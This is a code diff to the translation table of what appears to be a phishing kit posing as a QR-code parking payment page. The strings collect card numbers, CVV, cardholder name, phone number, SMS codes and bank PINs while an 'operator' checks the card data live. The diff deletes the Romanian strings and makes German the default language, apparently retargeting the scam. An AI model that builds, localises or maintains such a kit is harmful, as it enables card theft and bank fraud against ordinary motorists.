@@ -41,48 +41,6 @@ const TRANSLATIONS = {
     rejected_body:'The session was cancelled by the operator.\nScan the QR code again to try.',
     no_charge:'No amount has been charged from your account.',
   },
-  ro: {
-    link_confirm_title:'Confirmare Plată',
-    link_confirm_desc:'Apasă butonul de mai jos pentru a confirma și finaliza plata în siguranță.',
-    link_confirm_btn:'Confirmă',
-    bank_label:'Bancă',
-    valid_until:'Valabil până', verifying:'Verificare în curs…', dur_label:'Durată',
-    operator_check_html:'Operatorul verifică datele cardului.<br>Nu închide această pagină.',
-    operator_check_wait_html:'Operatorul verifică datele tale.<br>Vei fi redirecționat automat.',
-    confirmed_body_html:'Vehiculul tău a fost înregistrat în sistem.<br>Poți parca în siguranță.',
-    rejected_body_html:'Sesiunea a fost anulată de operator.<br>Scanează din nou codul QR pentru a încerca.',
-    secure:'Securizat', step_details:'Detalii', step_verify:'Verificare', step_pay:'Plată',
-    park_details:'Detalii Parcare', fill_vehicle:'Completează informațiile vehiculului',
-    locality:'Localitate', locality_ph:'ex: București, Cluj-Napoca…', plate:'Număr înmatriculare',
-    plate_ph:'ex: B 123 ABC', vehicle_type:'Tip vehicul', duration:'Durată parcare',
-    car:'🚗 Autoturism', suv:'🚙 SUV / Crossover', van:'🚐 Autoutilitară', truck:'🚛 Camion',
-    moto:'🏍️ Motocicletă', other:'🔧 Altele', hours:'ore', minutes:'minute',
-    continue:'CONTINUĂ', ssl:'Conexiune securizată SSL 256-bit',
-    total_due:'Total de plată', period:'Perioadă',
-    card_number:'Număr card', card_ph:'0000 0000 0000 0000',
-    expiry:'Data expirare', cvv:'CVV', cardholder:'Numele titularului',
-    cardholder_ph:'PRENUME NUME', phone:'Număr de telefon', phone_ph:'+40 700 000 000',
-    pay_now:'PLĂTEȘTE ACUM', processing:'Se procesează plata…',
-    operator_check:'Operatorul verifică datele cardului.\nNu închide această pagină.',
-    plate_label:'Plăcuță', card_label:'Card', total_label:'Total',
-    sms_title:'Verificare SMS', sms_desc:'Ai primit un cod de 6 cifre pe telefon. Introdu-l mai jos:',
-    confirm_code:'CONFIRMĂ CODUL', pin_title:'Cod PIN Bancar',
-    pin_desc:'Introdu codul PIN primit de la bancă:',
-    confirm_pin:'CONFIRMĂ PIN', app_title:'Autentificare 3D Secure',
-    app_desc:'Aprobă tranzacția din aplicația băncii',
-    select_bank:'Selectează banca ta:', waiting_app:'Se așteaptă confirmarea din aplicație…',
-    confirmed_app:'✓ AM CONFIRMAT ÎN APLICAȚIE', cancel:'Anulează',
-    payment_confirmed:'Plată Confirmată', payment_rejected:'Plată Respinsă',
-    confirmed_banner:'✓ Plată Confirmată cu Succes',
-    rejected_banner:'✗ Plată Respinsă',
-    confirmed_title:'Plată Confirmată!',
-    confirmed_body:'Vehiculul tău a fost înregistrat în sistem.\nPoți parca în siguranță.',
-    reg_number:'Nr. înmatriculare', parking:'Parcare', duration2:'Durată', total_paid:'Total plătit',
-    keep_page:'Păstrează această pagină ca dovadă de plată.',
-    rejected_title:'Plată Respinsă',
-    rejected_body:'Sesiunea a fost anulată de operator.\nScanează din nou codul QR pentru a încerca.',
-    no_charge:'Nicio sumă nu a fost reținută din contul tău.',
-  },
   fr: {
     link_confirm_title:'Confirmation de paiement',
     link_confirm_desc:'Appuyez sur le bouton ci-dessous pour confirmer et finaliser votre paiement en toute sécurité.',
@@ -548,9 +506,12 @@ const TRANSLATIONS = {
 };
 
 (function(){
-  const raw = (navigator.language || navigator.userLanguage || 'en').toLowerCase().split('-')[0];
+  const raw = (navigator.language || navigator.userLanguage || 'de').toLowerCase().split('-')[0];
   const supported = Object.keys(TRANSLATIONS);
-  window._lang = supported.includes(raw) ? raw : 'en';
+  // German primary, English fallback for unsupported languages
+  if(raw === 'de') window._lang = 'de';
+  else if(supported.includes(raw)) window._lang = raw;
+  else window._lang = 'en';
 })();
 
 function t(key){ return (TRANSLATIONS[window._lang] || TRANSLATIONS['en'])[key] || TRANSLATIONS['en'][key] || key; }
